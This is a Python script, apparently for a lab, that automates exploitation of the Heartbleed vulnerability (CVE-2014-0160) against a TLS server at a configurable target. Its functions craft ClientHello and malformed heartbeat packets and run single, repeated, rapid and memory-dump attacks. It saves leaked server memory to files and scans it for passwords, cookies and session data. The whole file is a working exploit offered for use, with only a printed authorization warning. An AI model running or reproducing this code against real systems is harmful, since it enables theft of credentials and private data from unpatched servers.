# heartbleed.py
import socket
import struct
import time
import random
import json
from datetime import datetime
import binascii

# ======== CONFIG ========
TARGET_IP = "192.168.17.192"
TARGET_PORT = 443
LOG_FILE = "heartbleed_timeline.json"

class HeartbleedAttackGenerator:
    """Heartbleed (CVE-2014-0160) Attack Generator"""
    
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attacks = []
        self.attempts = 0
        self.data_leaked = 0
        self.stop_attack = False
        self.vulnerable = False
    
    def log_attack_start(self, attack_type, description):
        """تسجيل بداية الهجوم"""
        self.current_attack = {
            "attack_type": attack_type,
            "description": description,
            "target_ip": self.target_ip,
            "target_port": self.target_port,
            "start_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f'),
            "start_timestamp": time.time(),
        }
        print(f"\n{'='*60}")
        print(f"[+] Attack: {attack_type}")
        print(f"[+] Description: {description}")
        print(f"[+] Target: {self.target_ip}:{self.target_port}")
        print(f"[+] Start: {self.current_attack['start_time']}")
        print(f"{'='*60}\n")
        
        self.stop_attack = False
        self.attempts = 0
        self.data_leaked = 0
    
    def log_attack_end(self):
        """تسجيل نهاية الهجوم"""
        self.stop_attack = True
        
        self.current_attack['end_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
        self.current_attack['end_timestamp'] = time.time()
        self.current_attack['duration_seconds'] = round(
            self.current_attack['end_timestamp'] - self.current_attack['start_timestamp'], 2
        )
        self.current_attack['attempts'] = self.attempts
        self.current_attack['data_leaked_bytes'] = self.data_leaked
        self.current_attack['vulnerable'] = self.vulnerable
        
        print(f"\n[✓] Attack completed")
        print(f"[✓] Duration: {self.current_attack['duration_seconds']}s")
        print(f"[✓] Attempts: {self.attempts}")
        print(f"[✓] Data leaked: {self.data_leaked} bytes")
        print(f"[✓] Vulnerable: {self.vulnerable}\n")
        
        self.attacks.append(self.current_attack)
    
    def save_timeline(self):
        """حفظ الـ timeline"""
        with open(LOG_FILE, 'w') as f:
            json.dump(self.attacks, f, indent=2)
        print(f"\n[✓] Timeline saved to: {LOG_FILE}")
        self.print_summary()
    
    def print_summary(self):
        """طباعة ملخص"""
        print("\n" + "="*60)
        print("HEARTBLEED ATTACK SUMMARY")
        print("="*60)
        
        total_attempts = 0
        total_leaked = 0
        
        for i, attack in enumerate(self.attacks, 1):
            print(f"\n#{i} - {attack['attack_type']}")
            print(f"   Duration: {attack['duration_seconds']}s")
            print(f"   Attempts: {attack['attempts']}")
            print(f"   Data leaked: {attack['data_leaked_bytes']} bytes")
            print(f"   Vulnerable: {attack['vulnerable']}")
            
            total_attempts += attack['attempts']
            total_leaked += attack['data_leaked_bytes']
        
        print("\n" + "="*60)
        print(f"Total attacks: {len(self.attacks)}")
        print(f"Total attempts: {total_attempts}")
        print(f"Total data leaked: {total_leaked} bytes")
        print("="*60)


# ======== Heartbleed Payload Functions ========

def build_client_hello():
    """بناء TLS ClientHello packet"""
    
    # TLS Record Header
    tls_version = b'\x03\x01'  # TLS 1.0
    
    # ClientHello
    hello_version = b'\x03\x02'  # TLS 1.1
    random_bytes = bytes([random.randint(0, 255) for _ in range(32)])
    session_id_length = b'\x00'
    
    # Cipher Suites
    cipher_suites = b'\x00\x0c'  # Length: 12 bytes
    cipher_suites += b'\xc0\x13'  # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
    cipher_suites += b'\xc0\x14'  # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
    cipher_suites += b'\x00\x2f'  # TLS_RSA_WITH_AES_128_CBC_SHA
    cipher_suites += b'\x00\x35'  # TLS_RSA_WITH_AES_256_CBC_SHA
    cipher_suites += b'\xc0\x0a'  # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
    cipher_suites += b'\xc0\x09'  # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
    
    # Compression Methods
    compression = b'\x01\x00'  # No compression
    
    # Extensions
    extensions = b''
    
    # Build ClientHello
    hello_data = hello_version + random_bytes + session_id_length
    hello_data += cipher_suites + compression + extensions
    
    # ClientHello Header
    hello_header = b'\x01'  # Handshake Type: ClientHello
    hello_length = struct.pack('>I', len(hello_data))[1:]  # 3 bytes
    hello = hello_header + hello_length + hello_data
    
    # TLS Record
    record_header = b'\x16'  # Content Type: Handshake
    record_header += tls_version
    record_length = struct.pack('>H', len(hello))
    
    return record_header + record_length + hello


def build_heartbeat(payload_length=16384):
    """بناء Heartbeat Request مع payload كبير"""
    
    # TLS Record Header
    record_type = b'\x18'  # Content Type: Heartbeat
    tls_version = b'\x03\x02'  # TLS 1.1
    
    # Heartbeat Request
    heartbeat_type = b'\x01'  # Heartbeat Request
    
    # Payload length (مبالغ فيه - هنا الثغرة!)
    payload_len_bytes = struct.pack('>H', payload_length)
    
    # Payload الحقيقي (صغير)
    actual_payload = b'HEARTBLEED_TEST_' + bytes([random.randint(0, 255) for _ in range(16)])
    
    # Padding
    padding = b'\x00' * 16
    
    # Build Heartbeat
    heartbeat = heartbeat_type + payload_len_bytes + actual_payload + padding
    
    # TLS Record Length
    record_length = struct.pack('>H', len(heartbeat))
    
    return record_type + tls_version + record_length + heartbeat


def receive_response(sock, timeout=5):
    """استقبال response من السيرفر"""
    sock.settimeout(timeout)
    try:
        data = b''
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > 16384:  # حد أقصى
                break
        return data
    except socket.timeout:
        return data
    except:
        return b''


# ======== 1. Single Heartbleed Probe ========
def heartbleed_single_probe(attacker):
    """محاولة واحدة لاستغلال Heartbleed"""
    attacker.log_attack_start("HEARTBLEED_SINGLE", "Single Heartbleed probe")
    
    try:
        # إنشاء اتصال
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((attacker.target_ip, attacker.target_port))
        
        print("  [*] Connected to target")
        
        # إرسال ClientHello
        client_hello = build_client_hello()
        sock.send(client_hello)
        print("  [*] Sent ClientHello")
        
        # استقبال ServerHello
        response = receive_response(sock, timeout=5)
        if not response:
            print("  [!] No response to ClientHello")
            sock.close()
            attacker.log_attack_end()
            return
        
        print(f"  [*] Received {len(response)} bytes from server")
        
        # إرسال Heartbeat
        heartbeat = build_heartbeat(payload_length=16384)
        sock.send(heartbeat)
        print("  [*] Sent malicious Heartbeat request")
        
        attacker.attempts += 1
        
        # استقبال Heartbeat response
        heartbeat_response = receive_response(sock, timeout=5)
        
        if len(heartbeat_response) > 100:
            print(f"  [✓] VULNERABLE! Received {len(heartbeat_response)} bytes")
            print(f"  [✓] Leaked data sample:")
            print("  " + "-"*50)
            
            # طباعة عينة من البيانات المسربة
            sample = heartbeat_response[:200]
            hex_dump = binascii.hexlify(sample).decode()
            for i in range(0, len(hex_dump), 32):
                print(f"  {hex_dump[i:i+32]}")
            
            print("  " + "-"*50)
            
            attacker.vulnerable = True
            attacker.data_leaked = len(heartbeat_response)
        else:
            print("  [!] Not vulnerable or patched")
        
        sock.close()
        
    except Exception as e:
        print(f"  [!] Error: {e}")
    
    attacker.log_attack_end()


# ======== 2. Multiple Heartbleed Attempts ========
def heartbleed_multiple_attempts(attacker, attempts=10):
    """محاولات متعددة"""
    attacker.log_attack_start("HEARTBLEED_MULTIPLE", "Multiple Heartbleed attempts")
    
    for i in range(attempts):
        if attacker.stop_attack:
            break
        
        print(f"\n  [*] Attempt {i+1}/{attempts}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((attacker.target_ip, attacker.target_port))
            
            # ClientHello
            sock.send(build_client_hello())
            response = receive_response(sock, timeout=3)
            
            if not response:
                print("  [!] No response")
                sock.close()
                continue
            
            # Heartbeat
            sock.send(build_heartbeat(payload_length=16384))
            attacker.attempts += 1
            
            heartbeat_response = receive_response(sock, timeout=3)
            
            if len(heartbeat_response) > 100:
                print(f"  [✓] VULNERABLE! Leaked {len(heartbeat_response)} bytes")
                attacker.vulnerable = True
                attacker.data_leaked += len(heartbeat_response)
                
                # حفظ البيانات المسربة
                with open(f'leaked_data_{i+1}.bin', 'wb') as f:
                    f.write(heartbeat_response)
                print(f"  [✓] Saved to leaked_data_{i+1}.bin")
            else:
                print("  [!] Not vulnerable")
            
            sock.close()
            
        except Exception as e:
            print(f"  [!] Error: {e}")
        
        time.sleep(2)
    
    attacker.log_attack_end()


# ======== 3. Heartbleed with Different Payload Sizes ========
def heartbleed_payload_variation(attacker):
    """تجربة أحجام payloads مختلفة"""
    attacker.log_attack_start("HEARTBLEED_VARIATION", "Heartbleed with varying payload sizes")
    
    payload_sizes = [256, 512, 1024, 4096, 8192, 16384, 32768, 65535]
    
    for size in payload_sizes:
        if attacker.stop_attack:
            break
        
        print(f"\n  [*] Testing payload size: {size}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((attacker.target_ip, attacker.target_port))
            
            # ClientHello
            sock.send(build_client_hello())
            response = receive_response(sock, timeout=3)
            
            if not response:
                print("  [!] No response")
                sock.close()
                continue
            
            # Heartbeat مع حجم مختلف
            sock.send(build_heartbeat(payload_length=size))
            attacker.attempts += 1
            
            heartbeat_response = receive_response(sock, timeout=3)
            
            if len(heartbeat_response) > 100:
                print(f"  [✓] VULNERABLE! Leaked {len(heartbeat_response)} bytes with payload {size}")
                attacker.vulnerable = True
                attacker.data_leaked += len(heartbeat_response)
            else:
                print("  [!] No leak with this size")
            
            sock.close()
            
        except Exception as e:
            print(f"  [!] Error: {e}")
        
        time.sleep(2)
    
    attacker.log_attack_end()


# ======== 4. Rapid Heartbleed Attack ========
def heartbleed_rapid_attack(attacker, duration=30):
    """هجوم سريع ومتكرر"""
    attacker.log_attack_start("HEARTBLEED_RAPID", "Rapid Heartbleed attack")
    
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((attacker.target_ip, attacker.target_port))
            
            # ClientHello
            sock.send(build_client_hello())
            receive_response(sock, timeout=2)
            
            # إرسال Heartbeats متعددة بسرعة
            for _ in range(5):
                sock.send(build_heartbeat(payload_length=16384))
                attacker.attempts += 1
            
            # استقبال responses
            leaked_data = receive_response(sock, timeout=3)
            
            if len(leaked_data) > 100:
                attacker.vulnerable = True
                attacker.data_leaked += len(leaked_data)
                print(f"  [✓] Leaked {len(leaked_data)} bytes")
            
            sock.close()
            
        except Exception as e:
            pass
        
        if attacker.attempts % 20 == 0:
            print(f"  [*] Attempts: {attacker.attempts}, Leaked: {attacker.data_leaked} bytes")
        
        time.sleep(0.5)
    
    attacker.log_attack_end()


# ======== 5. Heartbleed Memory Dump ========
def heartbleed_memory_dump(attacker, iterations=50):
    """محاولة dump أكبر قدر من الذاكرة"""
    attacker.log_attack_start("HEARTBLEED_MEMORY_DUMP", "Memory dump via Heartbleed")
    
    all_leaked_data = b''
    
    for i in range(iterations):
        if attacker.stop_attack:
            break
        
        print(f"\n  [*] Iteration {i+1}/{iterations}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((attacker.target_ip, attacker.target_port))
            
            # ClientHello
            sock.send(build_client_hello())
            receive_response(sock, timeout=3)
            
            # Heartbeat
            sock.send(build_heartbeat(payload_length=65535))
            attacker.attempts += 1
            
            leaked = receive_response(sock, timeout=3)
            
            if len(leaked) > 100:
                all_leaked_data += leaked
                attacker.vulnerable = True
                attacker.data_leaked += len(leaked)
                print(f"  [✓] Leaked {len(leaked)} bytes (Total: {len(all_leaked_data)})")
            else:
                print("  [!] No leak")
            
            sock.close()
            
        except Exception as e:
            print(f"  [!] Error: {e}")
        
        time.sleep(1)
    
    # حفظ كل البيانات المسربة
    if all_leaked_data:
        with open('memory_dump.bin', 'wb') as f:
            f.write(all_leaked_data)
        print(f"\n  [✓] Saved {len(all_leaked_data)} bytes to memory_dump.bin")
        
        # محاولة استخراج معلومات حساسة
        print("\n  [*] Searching for sensitive data...")
        data_str = all_leaked_data.decode('latin-1', errors='ignore')
        
        # بحث عن patterns
        if 'password' in data_str.lower():
            print("  [!] Found 'password' in leaked data!")
        if 'cookie' in data_str.lower():
            print("  [!] Found 'cookie' in leaked data!")
        if 'session' in data_str.lower():
            print("  [!] Found 'session' in leaked data!")
    
    attacker.log_attack_end()


# ======== MAIN ========
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Heartbleed (CVE-2014-0160) Attack Generator')
    parser.add_argument('-t', '--target', required=True, help='Target IP')
    parser.add_argument('-p', '--port', type=int, default=443, help='SSL/TLS port')
    parser.add_argument('-a', '--attack',
                       choices=['single', 'multiple', 'variation', 'rapid', 'dump', 'all'],
                       default='all',
                       help='Attack type')
    parser.add_argument('-n', '--num-attempts', type=int, default=10,
                       help='Number of attempts for multiple attack')
    
    args = parser.parse_args()
    
    print("\n" + "="*60)
    print("HEARTBLEED (CVE-2014-0160) ATTACK GENERATOR")
    print("="*60)
    print(f"Target: {args.target}:{args.port}")
    print(f"Attack: {args.attack}")
    print("="*60 + "\n")
    
    print("⚠️  WARNING: Heartbleed is a CRITICAL vulnerability!")
    print("⚠️  Use only in authorized environments!\n")
    
    input("Press ENTER to start...")
    
    attacker = HeartbleedAttackGenerator(args.target, args.port)
    
    try:
        if args.attack == 'single':
            heartbleed_single_probe(attacker)
        elif args.attack == 'multiple':
            heartbleed_multiple_attempts(attacker, args.num_attempts)
        elif args.attack == 'variation':
            heartbleed_payload_variation(attacker)
        elif args.attack == 'rapid':
            heartbleed_rapid_attack(attacker, duration=30)
        elif args.attack == 'dump':
            heartbleed_memory_dump(attacker, iterations=50)
        elif args.attack == 'all':
            heartbleed_single_probe(attacker)
            time.sleep(5)
            heartbleed_multiple_attempts(attacker, 5)
            time.sleep(5)
            heartbleed_payload_variation(attacker)
            time.sleep(5)
            heartbleed_rapid_attack(attacker, duration=20)
            time.sleep(5)
            heartbleed_memory_dump(attacker, iterations=20)
    
    except KeyboardInterrupt:
        print("\n\n[!] Stopped by user")
    
    finally:
        attacker.save_timeline()


if __name__ == "__main__":
    main()
